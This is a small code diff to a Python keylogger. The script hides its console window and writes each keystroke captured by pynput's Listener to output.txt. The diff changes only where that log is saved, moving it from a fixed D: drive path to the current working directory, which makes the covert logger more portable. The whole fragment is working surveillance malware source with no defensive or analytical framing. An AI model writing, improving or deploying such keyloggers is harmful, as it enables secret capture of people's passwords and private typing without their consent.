@@ -7,7 +7,7 @@ from pynput.keyboard import Key, Listener
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
-log_file = os.path.expanduser("D:\\output.txt")
+log_file = os.path.join(os.getcwd(), "output.txt")
 
 # Define the function to write to the log file
 if os.path.exists(log_file):
@@ -17,7 +17,7 @@ if os.path.exists(log_file):
         f.write("\n{}".format(e))
 
 def write_to_log(key):
- log_file = "D:\\output.txt"
+ log_file = os.path.join(os.getcwd(), "output.txt")
  with open(log_file,'a') as f:
   f.write(str(key))     
 
